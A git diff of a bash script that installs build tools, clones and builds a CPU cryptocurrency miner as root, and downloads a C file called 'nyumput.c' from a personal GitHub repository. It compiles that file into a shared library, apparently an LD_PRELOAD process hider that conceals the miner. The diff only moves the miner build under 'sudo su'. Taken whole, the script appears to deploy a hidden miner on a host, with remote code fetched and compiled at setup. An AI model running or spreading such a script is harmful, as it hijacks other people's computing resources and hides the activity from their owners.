@@ -1,10 +1,7 @@
 #!/bin/bash
 apt-get update ; apt-get install sudo -y
 apt -y install git automake libcurl4-openssl-dev gcc
-git clone https://github.com/ocvcoin/cpuminer.git tes
-cd tes
-chmod 777 build.sh autogen.sh
-./build.sh 1
+sudo su --command "git clone https://github.com/ocvcoin/cpuminer.git tes && cd tes && chmod 777 build.sh autogen.sh && ./build.sh 1"
 curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
 apt-get install build-essential -y
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
